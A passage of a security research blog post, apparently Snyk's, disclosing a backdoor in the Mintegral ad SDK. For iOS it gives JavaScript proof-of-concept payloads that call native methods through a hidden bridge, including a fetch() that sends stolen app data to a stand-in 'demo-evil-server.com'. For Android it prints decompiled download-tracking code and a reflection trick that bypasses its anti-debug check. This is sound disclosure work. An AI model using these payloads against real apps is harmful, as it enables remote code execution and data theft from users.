* MTGRemoteCommandParser
* MTGInvocationBoxing

We decided to take a closer look at the binaries to understand what those files were used for.

### Affected versions

All versions of MintegralAdSDK prior to [6.5.0.0](https://github.com/Mintegral-official/MintegralAdSDK-iOS-new/releases/tag/6.5.0.0), inclusive. Version 6.6.0.0 published on the 10th of September 2020 doesn’t have the backdoor functionality described in this paper.

### The bridge implementation

We started by looking where the `MTGRemoteCommandParser` class is used and found only one place: `-(void)handleNativeObject:parameters:` in the `MTGBaseBridgeWebView` class.

From the implementation we can see that `-(void)handleNativeObject:parameters:` uses `MTGRemoteCommandParser` to parse the `parameters` argument and invokes the `-(void)dispatchCommand:feedback:` method in the `MTGCommandDispatcher` class.

At the first glance `-(void)handleNativeObject:parameters:` is not used, but that's not the case. Let’s see how it can be invoked from JavaScript code.

`MTGBaseBridgeWebView` implements the `-(void)webView:decidePolicyForNavigationAction:decisionHandler:` method of the [WKNavigationDelegate](https://developer.apple.com/documentation/webkit/wknavigationdelegate?language=objc) protocol. This method is called every time the navigation happens in the web view. This means we can trigger this method from within JavaScript by simply calling `location.href=something`. In the open source version of the SDK we found a regular expression that parses navigation request URLs: `mv://(.+?):(.+?)/(.+?)\\?([\\s\\S]*)`.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516902%2Fwordpress-sync%2F1-1.png&w=2560&q=75)

`-(void)callFunctionWithName:fucId:param:` in the screenshot above simply performs a call to `self` with `fucName` selector.

So, to call `-(void)handleNativeObject:parameters:` of `MTGBaseBridgeWebView` we need to have the following line of JavaScript code: `location.href = 'mv://1:fucId/handleNativeObject?<parameters>'`.

Please note that everything we have described above is still valid in the latest version of the SDK, at the time of writing, as well as the open source version of the SDK. The only exception is that `-(void)handleNativeObject:parameters:` has been deleted from the latest releases.

### Remote method invocation

We are not going to describe the full implementation of `MTGInvocationBoxing` and other classes. Instead we will show how it’s possible to craft malicious JavaScript code to trigger the remote method.

The following proof of concept attacks a "simple note" application, that has a NoteRepository class with two methods `+(void)save:` and `+(NSString*)load`.

We inject the malicious JavaScript code by replacing the Mintegral server with our own server implementation. The full source code of this application and server can be found [here](https://drive.google.com/file/d/1ss8SuYQx8mgvv4E8sRtaO9zupSRSOs83/view?usp=sharing) .

The malicious JavaScript code for this application is as follows:

```
window.WindVane = {
     onSuccess: function (_, data) {
         fetch('https://demo-evil-server.com/log?data=' + encodeURIComponent(atob(data)));
     }
 };

location.href = 'mv://1:fucId/handleNativeObject?{"uniqueIdentifier":"hbxtJ7QU+TPXJ75ZH+SXhFQTYbzP","name":"Y7KtHv==","result":{"type":3}}';
```

| **Value** | **Decoded** |
| --- | --- |
| hbxtJ7QU+TPXJ75ZH+SXhFQTYbzP | static\_NoteRepository |
| Y7KtHv== | load |

This code will call the `+(NSString*)load` method of the `NoteRepository` class and send the result to our *demo-evil-server.com/log* endpoint.

It uses the same obfuscation techniques as described in [the previous section](/blog/sour-mint-malicious-sdk/#payload-decoding). But the proof of concept already contains JavaScript code to perform encoding and decoding (see `banner.html`).

### Gaining full remote code execution (RCE)

In the example above we have seen how the SDK can be used to invoke any static method of an arbitrary class. In this section we will demonstrate how this can be leveraged to run any native code.

For demonstration purposes we will show how it’s possible to create a `UIAlertController` with the message "PWNED!".

Let’s look at the following Objective-C code as a reference:

```
UIAlertController *alert = [[UIAlertController alloc] init];
[alert setMessage:@"PWNED!"];
[[[[UIApplication sharedApplication] keyWindow] rootViewController] presentViewController:alert animated:YES completion:nil];
```

We need to figure out how to create and keep an instance of the `UIAlertController` between calls, how to get a shared application instance and how to call `presentViewController:animated:completion:` with the instance.

#### Step 1: Save ref to `UIAlertController` class

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhM==', // singleton_MTGSetting.jsonTitles
    'name': 'hF5TnFzqHkfTGrHXh3wQ4nE=', // setObject:forKey:
    'parameters': [
        {
            'type': 1,
            'value': {'uniqueIdentifier': 'hbxtJ7QU+25zNkeQhgxaYFPThrKsY75B'} // static_UIAlertController
        },
        {'type': 2, 'value': 'a' }
    ]
});
```

The `MTGRemoteCommandParser` supports two types of object references:

* `static` - gets a reference to a class object by name.
* `singleton` - performs multiple steps:

  + Gets a class by name (`MTGSetting` in our example).
  + Executes the `sharedInstance` method on the class. `[MTGSetting sharedInstance]`

    in Objective-C.
  + Uses `valueForKey:` to get dot-separated properties. In our case this will be `[[MTGSetting sharedInstance] valueForKey:@"jsonTitles"]`.

Note that `jsonTitles` is just an instance of `NSMutableDictionary`. In the exploit it is used as temporary storage for our refs. The `MTGRemoteCommandParser` supports next parameters types:

* `0` - number.
* `1` - reference.
* `2` - string.
* `4` - `nil`.

The reference (`1`) type allows us to pass a reference to an object as an argument of a method. Important to note that the `uniqueIdentifier` is parsed in exactly the same way as a top-level `uniqueIdentifier` - hence there is also support for the `singleton` type.

#### Step 2: Allocate a new instance of `UIAlertController` class

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhM==', // singleton_MTGSetting.jsonTitles
    'name': 'hF5TnFzqHkfTGrHXh3wQ4nE=', // setObject:forKey:
    'parameters': [
        {
            'type': 1,
            // singleton_MTGSetting.jsonTitles.a.alloc.init
            'value': {'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhBPtWrcsY7KUWrQ\/L+N='}
        },
        {'type': 2, 'value': 'b'}
    ]
});
```

All the magic is happening in `singleton_MTGSetting.jsonTitles.a.alloc.init` in this case. As we already know `singleton_MTGSetting.jsonTitles.a` provides us with a reference to the `UIAlertController` class. But, we need to figure out why `[[UIAlertController valueForKey:@"alloc"] valueForKey:@"init"]` works. From the documentation of [valueForKey:](https://developer.apple.com/documentation/objectivec/nsobject/1412591-valueforkey) we know:

*The search pattern that valueForKey: uses to find the correct value to return is described in* [*Accessor Search Patterns*](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/KeyValueCoding/SearchImplementation.html#//apple_ref/doc/uid/20000955) *in* [*Key-Value Coding Programming Guide*](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/KeyValueCoding/index.html#//apple_ref/doc/uid/10000107i)*.*

We discovered that `valueForKey:` can call any method by name if it is a zero-argument method.

So, we can now create a new instance of the `UIAlertController` class, that will be referenced by property `b` of `jsonTitles` dict.

#### Step 3: Set "PWNED!" message

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhBP0', // singleton_MTGSetting.jsonTitles.b
    'name': 'hF5Tnk5AhFcgHnE=', // setMessage:
    'parameters': [{'type': 2, 'value': 'PWNED!'}]
});
```

This step is pretty obvious - we call `setMessage:` on the `UIAlertController` instance to set the `PWNED!` message.

#### Step 4: Save ref to `UIApplication` class

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhM==', // singleton_MTGSetting.jsonTitles
    'name': 'hF5TnFzqHkfTGrHXh3wQ4nE=',
    'parameters': [
        {'type': 1, 'value': {'uniqueIdentifier': 'hbxtJ7QU+25zN+SMY7QUD+xuYF9='}}, // static_UIApplication
        {'type': 2, 'value': 'x' }
    ]
});
```

This step is similar to step 1. We need to save the `UIApplication` class reference in `jsonTitles.x`.

#### Step 5: Show the alert

```
location.href = 'mv://1:fucId/handleNativeObject?' + JSON.stringify({
    // singleton_MTGSetting.jsonTitles.x.sharedApplication.keyWindow.rootViewController
    'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhBP9WgfED+zQHjcMh7euDFcTLkK\/WrwQ45JuYrxXJBPBYFKT5rQQJTfXYgxBYFesH+R=',
    // presentViewController:animated:completion:
    'name': 'hdzQhF5\/JcHuH+JaYFPThrKsY75BGrc\/Lk2tJ753GrfXY+SsH+xuYF91',
    'parameters': [
        {
            'type': 1,
            // singleton_MTGSetting.jsonTitles.b
            'value': {'uniqueIdentifier': 'hFQ\/HFeQJ7K\/+T2Vx2fQJdxuYrh\/LgfXYQxuJ7eQhBP0'}
        },
        {'type': 0, 'value': 1},
        {'type': 4} // nil
    ]
});
```

This step looks complicated, but it just utilizes various techniques from the previous steps. In the Objective-c code it will be as follows:

```
[MTGSetting.sharedInstance.jsonTitles.x.sharedApplication.keyWindow.rootViewController
    presentViewController:MTGSetting.sharedInstance.jsonTitles.b // this is out instance of UIAlertController
    animated: 1
    completion: nil
];
```

At this point we have demonstrated how an alert can be shown with a Remote Code Execution. You can find full payload [here](https://drive.google.com/file/d/1ss8SuYQx8mgvv4E8sRtaO9zupSRSOs83/view?usp=sharing) . To call the steps one-by-one we created an array of actions and executed each action in the `window.WindVane.onSuccess` callback (in turn, after a previous action was completed).

A video demonstrating how clipboard content can be leaked by delivering the exploit via malicious ad.

![](/_next/image/?url=https%3A%2F%2Fimg.youtube.com%2Fvi%2Fn-mEMkeoUqs%2Fsddefault.jpg&w=2560&q=75)
### Source of the JavaScript exploit

We’ve already seen how the Mintegral SDK allows native remote code execution via JavaScript code. However, that JavaScript code is fully owned and controlled by Mintegral. But, interestingly, it’s possible to achieve the same via interactive ADs created by the advertisers themselves. The ads are JavaScript-based web pages.

Theoretically, an advertiser can accurately target a specific group of users or specific set of devices by delivering an malicious ad containing the JavaScript exploit.

### Conclusion

We can only speculate as to why Mintegral included the capability to invoke native methods remotely in their SDK, but from the way the classes were named, such as `MTGCommandDispatcher` and `MTGRemoteCommand`, we believe this was intentional. Additionally, Mintegral removed the code immediately after our publication, despite us not being aware of it at the time.

## [Download tracking in Android [October 2020]](/blog/sour-mint-malicious-sdk/#download-tracking)

### Overview

In the previous two sections of this research article we shared how the Snyk security team discovered malicious behavior in the Mintegral SDK that can be exploited on iOS devices leading to ad fraud, data leakage and remote code execution (RCE). We wanted to perform more research on the Android distribution of the SDK, which we’ll cover in this section.
 In summary, here are our key findings:

1. Download uri tracking from Google, affecting both browser and app downloads, including regular file downloads, email attachments and Google Docs links.
2. Tracking all APK downloads, both organic or not.

This data is being sent back to Mintegral’s servers.

### Observed behavior

Upon downloading a Google Docs link, we noticed the following requests being sent from the app to *https://n.systemlog.me*:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516882%2Fwordpress-sync%2F2-1.png&w=2560&q=75)

This is the same endpoint that was used in the iOS SDK to report data back to the Mintegral server. The payload is encoded, but we can use the decode logic that is in the SDK binary, to get the following:

```
p =  clever=kbs0hoR1R0RsRgD0G0R0Woz2YoR1kBzEJdxMhAuhW2MXH7KUhBPgYFKgY7V%2FDFKw%2BoKAhdzQDkxAL75QJdfhWF59h7KBJaKuHaTeid3enrQB%2Bbx%2Bx3TMVjcU%2BFQ5G5zwijtUZaSufjJFfruAxdtiHrKw5Ff%2BZZHQ4dSXhgx7YbzwD%2BNKh7xrR0M0LdxThdi1%2BoKhWFxXDBTMfo20DB2AL75QJdi%2FHFKXHFeQJ%2BfQhrfXYgxQYgN%2FDFKw%2BoKQ4dSXhgxhWFM2YavAG%2BiFYr32J%2B5whkzALUQXincsYkxU%2BoKuGatrLbf%2FYAcsYbfefAiAJ7wuHkwtf7JqL2MXinDMiUVPia3eiavMicMXinv9in32fAvPiaRPiajFiURPfavA%2BoIq%2BoIeid3enrQB%2Bbx%2Bx3TMVjcU%2BFQ5G5zwijtUZaSufjJFfruAxdtiHrKw5Ff%2BZnKuHaTeid3enrQB%2Bbx%2Bx3TMVjcU%2BFQ5G5zwijtUZaSufjJFfruAxdtiHrKw5Ff%2BZZHQ4dSXhgx7YbzwD%2BNKh7xrRQTsRrwbRUE0hF5Uhr5TWgS3H0RsRrHsRUE0inRTf0zK%2BN%3D%3D
app_id=118690
sign=9329a7706dd43d6ed64d022ad0e7b13b
platform=1
os_version=5.1.1
package_name=com.mintegral.sdk.demo
app_version_name=1.0
app_version_code=1
orientation=1
model=Android+SDK+built+for+x86
brand=Android
gaid=a717e74d-64fa-464e-a28a-cbb8dc67ef6b
mnc=260
mcc=310
network_type=13
language=en
timezone=GMT%2B02%3A00
useragent=Mozilla%2F5.0+%28Linux%3B+Android+5.1.1%3B+Android+SDK+built+for+x86+Build%2FLMY48X%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Chrome%2F39.0.0.0+Mobile+Safari%2F537.36
sdk_version=MAL_10.5.0
gp_version=1.8
screen_size=1080x2160
has_wx=false
cache1=747
cache2=722
power_rate=100
charging=1
http_req=2
dvi=4BztYrxBYFQ3%2BFQ3RUE0fnVFDn5tDU3Mfkz0H7H3iBRsRrfuHoR1RUv0Woz3Y%2BN0G0Refnl9R0M0H72rRUEbfUvsRrfTRUE0kbl9fQT06N%3D%3D
unknown_source=1
sys_id=a54a2ddc-1a89-5ac3-aa69-d6b7906afa29
is_clever=2
```

We have two additional encoded parameters, `clever` and `dvi`. After decoding them as well, we noticed something interesting:

```
{
    "fl": "1246",
    "kw": "secret.pdf",
    "p": "",
    "ul": [
        "https://docs.google.com/spreadsheets/export?id=10y1Nir_tWFM0PAc_iU9Rm0HcH0i4Gv6jsDxLfomWcWI&exportFormat=pdf",
        "https://doc-04-bc-sheets.googleusercontent.com/export/l5l039s6ni5uumqbsj9o11lmdc/i88fksno1losq733tkieka4gjk/1602590910000/108195709029016229403/*/10y1Nir_tWFM0PAc_iU9Rm0HcH0i4Gv6jsDxLfomWcWI?id=10y1Nir_tWFM0PAc_iU9Rm0HcH0i4Gv6jsDxLfomWcWI&exportFormat=pdf"
    ],
    "v": ""
}

{
    "android_id": "556a5ab905bbdfd3",
    "cid": "0",
    "ct": "[x86]",
    "dmf": 760,
    "dmt": "1588"
}
```

As we can see, the URL of the google sheet we downloaded from the Google Drive app is sent to the backend in the `ul` file and the downloaded filename in the `kw` field while `dvi` holds some data on the device.

### Potential uses

In the iOS scenario, fraudulent duplicate clicks were sent from the client’s device onto Mintegral’s servers and then to the attribution provider (MMP). In this case, the downloaded or installed apks are reported to the servers and can potentially be used to generate server-side clicks. The following diagram demonstrates the data flow:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516921%2Fwordpress-sync%2F3-1.png&w=960&q=75)
### Alphab module

The behavior, mentioned above, is located in the alphab module which was described by Mintegral as an “Optimization package”:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516910%2Fwordpress-sync%2F4-1.png&w=2560&q=75)

Following [our publication](/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/), the module was removed from the Mintegral site and seems to no longer be part of the distributed SDK. We’ve decompiled the SDK and located the code responsible for this behavior.

### AlphaCommonConst class

```
public final class AlphaCommonConst {

    /* renamed from: a */
    public static String f0a = a.c("LdxThdi1WBK\\/WgfPhbxQYkeXHBPwHZKAJ7eXHM==");

    /* renamed from: b */
    public static String f1b = a.c("LdxThdi1WBK\\/WgfPhbxQYkeXHBPwHZKsYFh=");

    /* renamed from: c */
    public static String f2c = "decode error";

    /* renamed from: d */
    public static boolean is_net_debug = false;

    /* renamed from: com.alphab.a$a */
    /* compiled from: AlphaCommonConst */
    public static class C0000a {

        /* renamed from: a */
        public static String ACTION_NET_DEBUG = AlphabBase64Util.m1b("aEqMQ3ckisLAfcxK7En575xOayJIYsT=");

        /* renamed from: b */
        public static String f5b = AlphabBase64Util.m1b("aELKr0xI7ULIYeJAYeN6aEbPQEx6FAVVNPBVJPHmNZJXJZN=");
    }
```

This class contains many hard coded constant definitions. Some strings are obfuscated with their own custom Base64 based encoding scheme located in the `AlphabBase64Util` class, similar to what we observed in the iOS distribution.

After decoding we get the following strings:

```
aEqMQ3ckisLAfcxK7En575xOayJIYsT=                   = alphab_net_debug_action
aELKr0xI7ULIYeJAYeN6aEbPQEx6FAVVNPBVJPHmNZJXJZN=   = android.intent.action.PACKAGE_ADDED
7sHPNsx6f3H6fcnArsxzf0H2                           = getContentResolver
aELKr0xI7UL67iN6HinI                               = android.net.Uri
aELKr0xI7ULKaiJOa0cg7jLoYsLP7ELP9sng7ins7iC=       = android.database.ContentObserver
aELKr0xI7ULGYsLP7ELPFKb4YeJAYeJj7ib4Yp7ArR==       = android.content.ContentResolver
r0HeQibP7inoYsLP7ELP9sng7ins7iC=                   = registerContentObserver
aELKr0xI7ULGYsLP7ELPFKn2YscKascgfcnAasHIf0H2       = android.content.BroadcastReceiver
aELKr0xI7ULGYsLP7ELPFKA6f3H6fX7IYpJArR==           = android.content.IntentFilter
aEJKNEbPQEx6                                       = addAction
r0HeQibP7inj7EbAQi7ArR==                           = registerReceiver
```

These are used in the initialization steps we’ll discuss next.

### Alphab receiver

In the `init()` method of the `AlphabReceiver` class, the [BroadcastReceiver](https://developer.android.com/reference/android/content/BroadcastReceiver) is being initialized with some of the previously obfuscated strings:

```
 try {
      AlphabReceiver alphabReceiver = new AlphabReceiver();
      Class cls = Class.forName(AlphaCommonConst.C0001b.f11f);
      Class cls2 = Class.forName(AlphaCommonConst.C0001b.f12g);
      Object newInstance = cls2.newInstance();
      Method method = IntentFilter.class.getMethod(AlphaCommonConst.C0001b.f13h, String.class);
      method.invoke(newInstance, AlphaCommonConst.C0000a.ACTION_NET_DEBUG);
      method.invoke(newInstance, AlphaCommonConst.C0000a.f5b);
      Context.class.getMethod(AlphaCommonConst.C0001b.f14i, cls, cls2).invoke(context, alphabReceiver, newInstance);
      } catch (Throwable th) {
            th.printStackTrace();
      }
```

by replacing this with the decoded strings, the code becomes:

```
AlphabReceiver alphab_receiver = new AlphabReceiver();
Class alphab_receiver_cls = Class.forName("android.content.BroadcastReceiver");
Class intent_filter_cls = Class.forName("android.content.IntentFilter");
Object intent_inst = intent_filter_cls.newInstance();
Method method = IntentFilter.class.getMethod("addAction", String.class);
method.invoke(intent_inst, "alphab_net_debug_action");
method.invoke(intent_inst, "android.intent.action.PACKAGE_ADDED");
Context.class.getMethod("registerReceiver", alphab_receiver_cls, intent_filter_cls)
		.invoke(context, alphab_receiver, intent_inst);
```

We can see that with use of the Java Reflection API, a new broadcast receiver is created that listens for two types of intents:

* `android.intent.action.PACKAGE_ADDED` - a system wide intent that triggers when a package is being installed on the device.
* `alphab_net_debug_action` - a custom intent that appears to detect network debugging.

Upon receiving the intent, the `AlphabReceiver` class constructs a `ParseAndLoad()` method:

```
public final class ParseAndLoad {

    /* renamed from: a */
    private Intent f89a;

    public ParseAndLoad(Intent intent) {
        this.f89a = intent;
        if (AlphaCommonConst.C0000a.ACTION_NET_DEBUG.equals(intent.getAction())) {
            AlphaCommonConst.is_net_debug = true;
        }
    }
}
```

This field is later on used in a condition:

```
public final class ParseAndLoad {

    /* renamed from: a */
    private Intent f89a;

    public ParseAndLoad(Intent intent) {
        this.f89a = intent;
        if (AlphaCommonConst.C0000a.ACTION_NET_DEBUG.equals(intent.getAction())) {
            AlphaCommonConst.is_net_debug = true;
        }
    }
}
```

Decompiling the two other methods in that if clause reveals that they check if the current network connection passes through a wifi proxy or a vpn client. These are meant to prevent debugging the app and sniffing its traffic. This intent allows the developers of the SDK to bypass this anti-debug functionality.

### Alphab observer

In a similar fashion, this [ContentObserver](https://developer.android.com/reference/android/database/ContentObserver)’s initialization block is also hidden within reflection and obfuscated strings:

```
C0014a aVar = new C0014a(this.f70i);
Object invoke = Context.class.getMethod(AlphaCommonConst.C0001b.f6a, new Class[0]).invoke(context, new Object[0]);
Class cls3 = Class.forName(AlphaCommonConst.C0001b.f7b);
                        Class cls4 = Class.forName(AlphaCommonConst.C0001b.f8c);                  Class.forName(AlphaCommonConst.C0001b.f9d).getMethod(AlphaCommonConst.C0001b.f10e, cls3, Boolean.TYPE, cls4).invoke(invoke, Uri.parse(AlphabBase64Util.m1b("asx6f3H6foh4FsJ4fsLzYscKrM==")), true, aVar);
```

After cleanup we get the following:

```
AlpahbObserver observer = new AlpahbObserver(handler);
Object contentResolverObject = Context.class.getMethod(AlphaCommonConst.REFLECT.GETCONTENTRESOLVER).invoke(context);
Class uriClass = Class.forName(AlphaCommonConst.REFLECT.URI_CLASS);
Class contentObserver = Class.forName(AlphaCommonConst.REFLECT.CONTENTOBSERVER_CLASS);
Class contentResolver = Class.forName(AlphaCommonConst.REFLECT.CONTENTRESOLVER_CLASS).getMethod(AlphaCommonConst.REFLECT.REGISTERCONTENTOBSERVER, uriClass, boolean.class, contentObserver)
	.invoke(contentResolverObject, Uri.parse(AlphabBase64Util.newBase64Decode(uriDownload)), true, observer);
```

This means that the content observer is registered to listen to the *content://downloads* uri and triggers whenever a file is downloaded to the device.

It will query the Android download manager for public downloads:

```
cursor = aVar.f64b.getContentResolver().query(Uri.parse(AlphabBase64Util.m1b("asx6f3H6foh4FsJ4fsLzYscKr2xMfEnzQEbm73xyY0q4aEJgFM==") + str), null, null, null, null);
```

and upon decoding the string we’ll get the following:

```
cursor = aVar.f64b.getContentResolver()
		.query(Uri.parse("content://downloads/public_downloads" + str), null, null, null, null);
```

If the download URL meets any of the following conditions, a report to *https://n.systemlog.met/stlog* will be generated:

1. Ends with `apk` - for manual downloads.
2. Refers to a package that belongs to `com.android.vending` or the url contains google.com - will catch any Google app or even browser url matching the condition.

Below is the code snippet that sends the request to the *https://n.systemlog.met/stlog* server.

```
else if (message.what == AlphabReqImpl.this.f23d && (eVar = new SCReq(AlphabReqImpl.this.f20a)) != null) {
                g.a("AlphabReqImpl", "setting  is request");
                eVar.b(0, AlphaCommonConst.f0a, AlphabReqImpl.this.f25f, AlphabReqImpl.this.f26g);
            }
```

which equals to:

```
else if (message.what == AlphabReqImpl.this.f23d && (req = new SCReq(AlphabReqImpl.this.f20a)) != null) {
                g.a("AlphabReqImpl", "setting  is request");
                req.send(0, "http://n.systemlog.me/stlog", AlphabReqImpl.this.f25f, AlphabReqImpl.this.f26g);
```

And here we can see the parameters that we saw in the captured request in our example:

```
    static /* synthetic */ void m26a(ReqPKGAndReportManager dVar, String str, String str2, List list, String str3, String str4) {
        try {
            if (TextUtils.isEmpty(str2)) {
                str2 = "";
            }
            if (TextUtils.isEmpty(str)) {
                str = "";
            }
            JSONArray jSONArray = new JSONArray();
            JSONObject jSONObject = new JSONObject();
            if (jSONObject != null) {
                try {
                    jSONObject.put("p", str);
                    jSONObject.put("v", str2);
                    JSONArray jSONArray2 = new JSONArray();
                    if (list != null && list.size() >= 0) {
                        for (int i = 0; i < list.size(); i++) {
                            jSONArray2.put(list.get(i));
                        }
                    }
                    jSONObject.put("ul", jSONArray2);
                    jSONObject.put("kw", str3);
                    jSONObject.put("fl", str4);
                } catch (Throwable th) {
                    if (MIntegralConstans.DEBUG) {
                        th.printStackTrace();
                    }
                }
            }
            jSONArray.put(jSONObject);
            String b = com.mintegral.msdk.base.utils.a.b(jSONArray.toString());
            dVar.f40i = new c();
            if (!(dVar.f40i == null || dVar.f20a == null)) {
                dVar.f40i.a("clever", b);
            }
            dVar.mo10a(dVar.f40i);
```

* `p` - downloading package name i.e. the app
* `v` - app version
* `ul` - downloaded file’s url
* `kw` - downloaded filename
* `fl` - file size

### Demo app

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516907%2Fwordpress-sync%2F5-1.png&w=960&q=75)

In order to demonstrate the behavior, we created a demo app that allowed us to:

1. Enable net debug flag with reflection to bypass anti-debug logic

```
buttonIsNetDebug.setOnClickListener(new View.OnClickListener() {
   @Override
   public void onClick(View v) {
       try {
           Class AlphaCommonConst = Class.forName("com.alphab.a");
           AlphaCommonConst.getDeclaredField("d").set(null, true);
       } catch (Exception e) {
           e.printStackTrace();
       }
   }
});
```

2. Download a file from a url that contains google.com

```
buttonDownloadGoogleLogo.setOnClickListener(new View.OnClickListener() {
   @Override
   public void onClick(View v) {
       Uri uri = Uri.parse("https://images.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png");
       DownloadManager.Request request = new DownloadManager.Request(uri);
       request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "googlelogo_color_272x92dp.png");
       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_ONLY_COMPLETION);
       DownloadManager manager = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
       manager.enqueue(request);
   }
});
```

3. Download a file from a url that ends with `apk`

```
buttonDownloadApk.setOnClickListener(new View.OnClickListener() {
   @Override
   public void onClick(View v) {
       Uri uri = Uri.parse("https://storage.evozi.com/apk/dl/16/09/04/com.shazam.android_1004300.apk?f=google.com");
       DownloadManager.Request request = new DownloadManager.Request(uri);
       request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "com.shazam.android_1004300.apk");
       request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_ONLY_COMPLETION);
       DownloadManager manager = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
       manager.enqueue(request);
   }
});
```

We captured the outbound requests with an http proxy. After clicking one of the download buttons, we can see a request being made to the server’s endpoint:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516907%2Fwordpress-sync%2F6-1.png&w=2560&q=75)

Here’s a video demonstrating the tracking behavior:

![](/_next/image/?url=https%3A%2F%2Fimg.youtube.com%2Fvi%2Fo79R4fr2cho%2Fsddefault.jpg&w=2560&q=75)
## [Timeline](/blog/sour-mint-malicious-sdk/#timeline)

| **Date** |  |
| --- | --- |
| August 5 | Snyk research team identifies that Mintegral iOS SDK performs excessive data collection and click hijacking |
| August 17 | Snyk responsibly discloses the findings to Apple |
| August 24 | Snyk publishes Sour Mint iOS findings |
| August 25 | Mintegral releases statement denying SDK allegations |
| September 3 | IronSource announced the removal of Mintegral from their mediation platform |
| September 3 | Mintegral releases version 6.5.0.0 of iOS SDK, removing the malicious and hidden \_CXX\_CXX\_OperationPKTask component |
| September 4 | MoPub (Twitter) Mediation Platform announced the decertification of Mintegral from their platform |
| September 4 | Mintegral announced their plans to open source their SDK |
| September 4 | Snyk research team identified hidden downloads tracking functionality in Android version of the SDK |
| September 9 | Snyk responsibly discloses the Android SDK findings to Google |
| September 10 | Mintegral releases version 6.6.0.0 of the iOS SDK, removing MTGRemoteCommandParser backdoor component |
| September 22 | Snyk get’s the source code version 6.6.0.0 of the iOS SDK and performs diff analysis |
| September 23 | Snyk identifies that Mintegral has removed the Google download tracking module from its Android SDK |
| September 30 | Through diff analysis Snyk identifies a backdoor in iOS version of the SDK allowing for RCE |
| October 2 | Snyk responsibly discloses new iOS findings to Apple |
| October 3 | Apple notifies affected publishers asking to remove the code allowing for RCE |
| October 15 | Snyk publishes latest iOS and Android findings |

Posted in:[Vulnerability Insights](/blog/?topic=vulnerability-insights)![malicious code, ad fraud](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516928%2Fwordpress-sync%2Fblog-main.png&w=2560&q=75)
### Snyk Top 10: Vulnerabilites you should know

Find out which types of vulnerabilities are most likely to appear in your projects based on Snyk scan results and security research.

[See the report](/snyk-top-10/ "See the report")
## Products & Solutions

* [What is Snyk?](/product/)
* [Developer Security Platform](/platform/)
* [Pricing](/plans/)
## Our Resources

* [Resource library](/resource-library/)
* [Blog](/blog/)
* [Snyk’s podcasts](/podcasts/the-secure-developer/)
## Our Ecosystem

* [Snyk Learn](/platform/learn/)
* [Snyk User Docs](https://docs.snyk.io/)
* [Snyk Support](https://support.snyk.io/hc/en-us)
* [Snyk Vuln Database](https://security.snyk.io/)
* [Snyk Updates](https://updates.snyk.io/)
* [Snyk Trust Center](https://trust.snyk.io/home)
## Company & Community

* [About Snyk](/about/)
* [Contact us](/contact-us/)
* [Book a demo](/schedule-a-demo/)
* [Careers](/careers/)
* [Events & webinars](/events/)
* [Ambassadors](/snyk-ambassadors/)
## Why Snyk

* [Snyk With GitHub](/comparison/github-and-snyk/)
* [Snyk vs Veracode](/comparison/snyk-vs-veracode/)
* [Snyk vs Checkmarx](/comparison/snyk-vs-checkmarx/)
* [Snyk vs Synopsys](/comparison/snyk-vs-synopsys/)

## The developer security platform

Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

[More about us](/about/ "More about us")

© 2025 Snyk Limited
Registered in England and Wales

* [Legal terms](/policies/terms-of-service/)
* [Privacy Notice](/policies/privacy/)
* [Terms of use](/policies/website-terms-of-use/)
* [California residents: do not sell my information](https://preferences.snyk.io/dont_sell)


=== Content from snyk.io_1a28f509_20250119_125942.html ===
[![Homepage](/_nuxt/header-logo.Dk_X-iWD.svg)](/)

2. [Snyk Vulnerability Database](/vuln)
3. [cocoapods](/vuln/cocoapods)
4. mintegraladsdk
# Malicious Package Affecting [mintegraladsdk](/package/cocoapods/mintegraladsdk) package, versions **<6.6.0.0**

---

### Severity

 Recommended 0.0high010

CVSS assessment made by Snyk's Security Team. [Learn more](/vuln/SNYK-COCOAPODS-MINTEGRALADSDK-598852#cvss)

### Threat Intelligence

Exploit Maturity

Snyk has a published code exploit for this vulnerability.

MatureEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.
Check out the EPSS
